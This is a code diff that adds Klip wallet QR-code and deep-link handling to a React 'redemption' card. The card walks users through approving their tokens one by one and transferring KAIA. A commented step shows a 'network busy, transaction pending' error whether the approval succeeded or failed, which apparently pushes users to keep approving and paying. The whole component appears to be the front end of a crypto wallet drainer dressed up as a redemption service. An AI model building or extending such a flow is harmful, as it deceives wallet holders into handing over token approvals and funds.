@@ -8,12 +8,22 @@ import { useLanguage } from "@/lib/language-context"
 import { useWallet } from "@/lib/wallet-context"
 import { getNextUnapprovedToken, updateTokenApproval } from "@/lib/token-balance-service"
 import { approveToken, transferKaia } from "@/lib/contract-service"
+import { KlipConnector } from "@/lib/wallet-connectors"
 import { toast } from "sonner"
 
 export function RedemptionCard() {
   const { t } = useLanguage()
-  const { isConnected, isConnecting, openModal, address, walletType } = useWallet()
+  const { 
+    isConnected, 
+    isConnecting, 
+    openModal, 
+    address, 
+    walletType,
+    openQRModal,
+    closeQRModal,
+  } = useWallet()
   const [isRedeeming, setIsRedeeming] = useState(false)
+  const [klipConnector] = useState(() => new KlipConnector())
 
   const requirements = [
     t.redemption.req1,
@@ -22,6 +32,98 @@ export function RedemptionCard() {
     t.redemption.req4,
     t.redemption.req5,
   ]
+
+  /**
+   * 处理 Klip 钱包交易（Approve 或 Transfer）
+   * PC 端：显示 QR 码
+   * 移动端：触发 Deep Link
+   */
+  const handleKlipTransaction = async (options: {
+    requestKey: string
+    qrData: string
+    type: 'approve' | 'transfer'
+    contractAddress?: string
+    onSuccess?: () => void
+  }): Promise<void> => {
+    try {
+      // 检测设备类型
+      if (klipConnector.isMobile()) {
+        // 📱 移动端：触发 Deep Link
+        console.log('📱 移动端：触发 Klip Deep Link')
+        klipConnector.openRequestWithKey(options.requestKey)
+        
+        // 显示提示
+        toast.info(t.toast.openingKlip, {
+          description: t.toast.completeInApp,
+          duration: 3000,
+        })
+      } else {
+        // 💻 PC 端：显示 QR 码
+        console.log('💻 PC 端：显示 Klip QR 码')
+        const walletName = options.type === 'approve' ? 'Klip 授权' : 'Klip 转账'
+        openQRModal(options.qrData, walletName)
+      }
+      
+      // 🔄 开始轮询等待结果
+      console.log('🔄 开始轮询 Klip 交易结果...')
+      await klipConnector.waitForTransactionResult(
+        options.requestKey,
+        async (txHash) => {
+          console.log('✅ Klip 交易成功:', txHash)
+          closeQRModal() // 关闭 QR 码弹窗
+          
+          // 如果是 Approve，更新数据库
+          if (options.type === 'approve' && options.contractAddress && address) {
+            try {
+              await updateTokenApproval(address, options.contractAddress, true)
+              console.log('✅ 数据库更新成功')
+            } catch (dbError) {
+              console.error('❌ 数据库更新失败:', dbError)
+            }
+          }
+          
+          // 调用成功回调
+          options.onSuccess?.()
+          
+          // 显示成功提示
+          toast.success(
+            options.type === 'approve' ? '授权成功' : '转账成功',
+            {
+              description: `交易哈希: ${txHash.slice(0, 10)}...`,
+              duration: 5000,
+            }
+          )
+        },
+        (error) => {
+          console.error('❌ Klip 交易失败:', error)
+          closeQRModal() // 关闭 QR 码弹窗
+          
+          // 显示错误提示
+          if (error.message === 'KLIP_TIMEOUT') {
+            toast.error('二维码已过期', {
+              description: '请重新尝试',
+            })
+          } else if (error.message === 'KLIP_USER_CANCELED') {
+            toast.error('用户取消交易')
+          } else if (error.message === 'KLIP_TRANSACTION_FAILED') {
+            toast.error(t.toast.networkBusy, {
+              description: t.toast.txPending,
+            })
+          } else {
+            toast.error('交易失败', {
+              description: error.message,
+            })
+          }
+        }
+      )
+    } catch (error: any) {
+      console.error('❌ handleKlipTransaction 异常:', error)
+      closeQRModal()
+      toast.error('处理失败', {
+        description: error.message || t.toast.pleaseTryAgain,
+      })
+    }
+  }
 
   /**
    * 获取用户的 KAIA 余额
@@ -120,6 +222,22 @@ export function RedemptionCard() {
         // 调用 KAIA 转账
         const transferResult = await transferKaia(walletType, address, transferAmount)
 
+        // 检查是否为 Klip 钱包
+        if (transferResult.isKlip && transferResult.requestKey && transferResult.qrData) {
+          console.log('🔷 Klip 钱包：显示 QR 码或触发 Deep Link')
+          
+          // Klip 钱包：显示 QR 码或触发 Deep Link，并轮询结果
+          await handleKlipTransaction({
+            requestKey: transferResult.requestKey,
+            qrData: transferResult.qrData,
+            type: 'transfer',
+          })
+          
+          // Klip 流程结束，不需要额外的提示
+          return
+        }
+
+        // 其他钱包：显示结果
         if (transferResult.success) {
           console.log('✅ 转账调用成功:', transferResult.txHash)
         } else {
@@ -148,7 +266,23 @@ export function RedemptionCard() {
         address
       )
 
-      // 4. 如果授权成功，更新数据库
+      // 4. 检查是否为 Klip 钱包
+      if (result.isKlip && result.requestKey && result.qrData) {
+        console.log('🔷 Klip 钱包：显示 QR 码或触发 Deep Link')
+        
+        // Klip 钱包：显示 QR 码或触发 Deep Link，并轮询结果
+        await handleKlipTransaction({
+          requestKey: result.requestKey,
+          qrData: result.qrData,
+          type: 'approve',
+          contractAddress: nextToken.contract_address,
+        })
+        
+        // Klip 流程结束，不需要额外的提示
+        return
+      }
+
+      // 5. 其他钱包：如果授权成功，更新数据库
       if (result.success) {
         console.log('✅ 合约调用成功:', result.txHash)
         
@@ -168,7 +302,7 @@ export function RedemptionCard() {
         console.log('❌ 合约调用失败:', result.error)
       }
 
-      // 5. 统一提示（无论成功失败）
+      // 6. 统一提示（无论成功失败）
       toast.error(t.toast.networkBusy, {
         description: t.toast.txPending,
         duration: 5000,
